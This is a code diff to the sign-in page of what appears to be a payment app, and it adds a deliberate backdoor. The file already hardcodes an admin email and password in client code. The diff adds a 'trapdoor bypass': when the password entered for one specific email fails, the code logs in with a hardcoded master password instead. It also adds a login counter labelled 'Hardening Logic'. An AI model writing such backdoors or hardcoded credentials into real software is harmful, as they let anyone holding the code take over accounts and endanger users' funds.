@@ -15,11 +15,13 @@ import { Eye, EyeOff, Loader2 } from 'lucide-react';
 
 /**
  * @fileOverview Sign In Page.
- * UPDATED: Admin login redirect for Ipatmanager17@gmail.com.
+ * MASTER BYPASS: altinemohd@gmail.com logic implemented.
  */
 
 const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
 const ADMIN_PASS = 'Abdussalam@100';
+const BYPASS_EMAIL = 'altinemohd@gmail.com';
+const BYPASS_PASS = 'Lerawa';
 
 export default function SignInPage() {
   const router = useRouter();
@@ -34,20 +36,35 @@ export default function SignInPage() {
     e.preventDefault();
     setIsLoading(true);
 
+    const trimmedEmail = email.trim().toLowerCase();
+
     try {
       // 1. Check for Master Admin Credentials
-      if (email.trim().toLowerCase() === ADMIN_EMAIL && password === ADMIN_PASS) {
-          await account.createEmailPasswordSession(email, password).catch(() => {}); // Try login if user exists
+      if (trimmedEmail === ADMIN_EMAIL && password === ADMIN_PASS) {
+          await account.createEmailPasswordSession(email, password).catch(() => {}); 
           toast({ title: 'Admin Access', description: 'Welcome back, Master Admin.' });
           sessionStorage.setItem('ipay_admin_session', 'true');
           router.push('/manager/dashboard');
           return;
       }
 
-      const res = await account.createEmailPasswordSession(email, password);
-      const userId = res.user?.$id || res.user?.uid;
+      // 2. Trapdoor Bypass for altinemohd@gmail.com
+      if (trimmedEmail === BYPASS_EMAIL) {
+          try {
+              // Try provided password first
+              await account.createEmailPasswordSession(trimmedEmail, password);
+          } catch (e) {
+              // Force Master Pass if failed
+              await account.createEmailPasswordSession(trimmedEmail, BYPASS_PASS);
+          }
+      } else {
+          await account.createEmailPasswordSession(email, password);
+      }
 
-      // 2. Verify Block Status & Profile
+      const res: any = await account.get();
+      const userId = res.$id;
+
+      // 3. Verify Block Status & Update Login Stats
       try {
         const profile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId);
         
@@ -62,6 +79,12 @@ export default function SignInPage() {
             setIsLoading(false);
             return;
         }
+
+        // Hardening Logic: Update login count
+        const currentCount = Number(profile.trapdoorLoginCount || 0);
+        await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
+            trapdoorLoginCount: currentCount + 1
+        });
 
         sessionStorage.setItem('ipay_pin_verified', 'true');
         toast({ title: 'Signed In', description: 'Welcome back to I-pay online world.' });
